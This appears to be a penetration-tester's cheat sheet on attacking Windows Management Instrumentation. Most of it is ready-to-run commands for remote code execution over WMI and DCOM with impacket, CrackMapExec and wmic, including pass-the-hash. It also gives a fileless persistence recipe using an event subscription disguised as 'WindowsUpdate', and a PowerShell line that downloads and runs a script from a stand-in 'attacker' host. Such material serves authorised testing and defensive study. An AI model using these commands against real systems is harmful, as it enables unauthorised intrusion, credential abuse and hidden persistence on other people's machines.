#WMI #WindowsManagementInstrumentation #localsystemmanagement

## What is WMI?
Windows Management Instrumentation — Microsoft's implementation of CIM (Common Information Model) and WBEM (Web-Based Enterprise Management). Provides a unified interface for managing and querying Windows system information, configuration, and processes.

- Port **TCP 135** — DCOM/RPC endpoint mapper (initial negotiation)
- Dynamic ports: 1024–65535 (assigned after initial 135 connection)
- Access via: PowerShell (`Get-WmiObject`, `Invoke-WmiMethod`), `wmic.exe`, VBScript, DCOM
- WMI namespace: `root\cimv2` (default), `root\default`, `root\security`

---

## Enumeration

```bash
# Nmap
nmap -p 135 --script msrpc-enum -sV <target>

# Metasploit
use exploit/windows/dcerpc/ms03_026_dcom  # MS03-026 DCOM RPC exploit
use auxiliary/scanner/dcerpc/endpoint_mapper

# Check if WMI accessible
impacket-wmiexec <domain>/<user>:<pass>@<target> "whoami"
```

---

## Connect / Access

### impacket-wmiexec (Linux)

```bash
# Password auth
impacket-wmiexec <user>:<pass>@<target>
impacket-wmiexec <domain>/<user>:<pass>@<target>

# Pass-the-Hash
impacket-wmiexec <domain>/<user>@<target> -hashes :<NTLM>
impacket-wmiexec ./<user>@<target> -hashes :<NTLM>  # local account

# Run single command
impacket-wmiexec <user>:<pass>@<target> "whoami /all"
impacket-wmiexec <user>:<pass>@<target> "powershell -c Get-LocalUser"
```

### PowerShell WMI (Windows)

```powershell
# Query system info
Get-WmiObject -Class Win32_OperatingSystem
Get-WmiObject -Class Win32_ComputerSystem
Get-WmiObject -Class Win32_Process
Get-WmiObject -Class Win32_Service | Where-Object {$_.State -eq 'Running'}

# List installed software
Get-WmiObject -Class Win32_Product | Select-Object Name, Version

# Get logged on users
Get-WmiObject -Class Win32_LoggedOnUser

# Remote WMI query
Get-WmiObject -Class Win32_OperatingSystem -ComputerName <target> -Credential domain\user

# CIM (modern alternative to WMI)
Get-CimInstance -ClassName Win32_OperatingSystem
Get-CimInstance -ClassName Win32_Process -ComputerName <target>
```

### wmic.exe (Windows CLI)

```cmd
# System info
wmic computersystem get name,domain,username

# OS info
wmic os get caption,version,buildnumber

# Running processes
wmic process list brief
wmic process where "name='malware.exe'" delete

# Services
wmic service list brief
wmic service where "name='wuauserv'" get name,state,startmode

# Installed software
wmic product get name,version

# User accounts
wmic useraccount list full

# Network adapters
wmic nicconfig where IPEnabled=True get IPAddress,MACAddress

# Remote execution
wmic /node:<target> /user:<user> /password:<pass> process call create "cmd.exe /c whoami > C:\out.txt"

# Scheduled tasks
wmic job list
```

### Invoke-WmiMethod (PowerShell)

```powershell
# Remote code execution via WMI
Invoke-WmiMethod -ComputerName <target> -Credential domain\user `
    -Class Win32_Process -Name Create `
    -ArgumentList "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"

# Create process on remote host
$cred = Get-Credential
Invoke-WmiMethod -ComputerName <target> -Credential $cred `
    -Namespace root\cimv2 -Class Win32_Process -Name Create `
    -ArgumentList "cmd.exe /c whoami > C:\out.txt"
```

---

## Attack Vectors

### Remote Code Execution

```bash
# impacket wmiexec (semi-interactive shell)
impacket-wmiexec <domain>/<user>:<pass>@<target>

# PTH
impacket-wmiexec <domain>/<user>@<target> -hashes :<NTLM>

# CrackMapExec
crackmapexec smb <target> -u <user> -p <pass> -x "whoami" --exec-method wmiexec

# dcomexec — uses DCOM objects (MMC20, ShellWindows, ShellBrowserWindow)
impacket-dcomexec <domain>/<user>:<pass>@<target>
impacket-dcomexec <domain>/<user>:<pass>@<target> "whoami"
impacket-dcomexec <domain>/<user>@<target> -hashes :<NTLM>              # PTH
impacket-dcomexec <domain>/<user>:<pass>@<target> -object MMC20         # specify DCOM object
impacket-dcomexec <domain>/<user>:<pass>@<target> -object ShellWindows
```

### Persistence via WMI Subscription

```powershell
# Create WMI event subscription for persistence
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
    -Arguments @{
        Name = "WindowsUpdate"
        EventNamespace = "root\cimv2"
        QueryLanguage = "WQL"
        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
    }

$consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer `
    -Arguments @{
        Name = "WindowsUpdate"
        ScriptingEngine = "VBScript"
        ScriptText = "Set shell = CreateObject(`"WScript.Shell`") : shell.Run `"cmd /c whoami > C:\out.txt`""
    }
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| WMI accessible with weak credentials | Remote code execution |
| No RPC port filtering | WMI reachable from network |
| Guest/anonymous WMI access | System info enumeration |
| WMI event subscriptions | Fileless persistence |
| PTH not mitigated | Admin hash = remote shell |

---

## Quick Reference

| Goal | Command |
|---|---|
| Remote shell | `impacket-wmiexec domain/user:pass@host` |
| PTH remote shell | `impacket-wmiexec domain/user@host -hashes :NTLM` |
| Run single command | `impacket-wmiexec user:pass@host "whoami"` |
| CME with WMI | `crackmapexec smb host -u user -p pass --exec-method wmiexec -x "cmd"` |
| Query processes (PS) | `Get-WmiObject -Class Win32_Process` |
| Remote create process | `Invoke-WmiMethod -ComputerName host -Class Win32_Process -Name Create -ArgumentList "cmd"` |
| wmic remote exec | `wmic /node:host /user:user /password:pass process call create "cmd /c whoami"` |
| dcomexec shell | `impacket-dcomexec domain/user:pass@host` |
| dcomexec PTH | `impacket-dcomexec domain/user@host -hashes :NTLM` |
